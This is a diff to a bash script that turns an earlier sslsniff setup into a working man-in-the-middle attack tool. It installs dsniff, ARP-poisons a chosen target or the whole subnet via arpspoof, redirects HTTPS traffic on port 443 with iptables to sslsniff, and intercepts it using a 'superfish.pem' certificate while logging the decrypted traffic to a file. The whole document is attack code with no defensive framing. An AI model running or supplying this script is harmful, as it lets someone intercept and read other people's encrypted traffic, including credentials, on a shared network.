@@ -1,10 +1,17 @@
 #!/bin/bash
 
-PKGSTOINSTALL="sslsniff"
+PKGSTOINSTALL="sslsniff dsniff"
 LISTENPORT=8775
+LOGFILE="superfish.log"
+
+INTERFACE=$1
+GATEWAY=$2
+if [ "$#" -eq 3 ]; then
+    TARGET=$3
+fi
 
 # Install required dependencies
-if ! which sslsniff > /dev/null ; then
+if ! which sslsniff > /dev/null || ! which arpspoof > /dev/null; then
 	echo -n "Some dependencies are missing. Want to install them? (Y/n): "
 	read SURE
 	# If user want to install missing dependencies
@@ -46,5 +53,19 @@ fi
 # Activate ip_forward mode
 sudo sh -c "echo 1 > /proc/sys/net/ipv4/ip_forward"
 
-#
+# Reroute traffic for sslsniff interception
 sudo iptables -t nat -A PREROUTING -p tcp --destination-port 443 -j REDIRECT --to-ports $LISTENPORT
+
+# arp poison target
+if [ "$#" -eq 3 ]; then
+    sudo arpspoof -i $INTERFACE -t $TARGET $GATEWAY &
+else
+    sudo arpspoof -i $INTERFACE $GATEWAY &
+fi
+
+# So long and thanks for all the fish!
+sslsniff -a -s $LISTENPORT -w $LOGFILE -c superfish.pem && fg
+
+# clean up
+sudo killall arpspoof
+sudo killall sslsniff
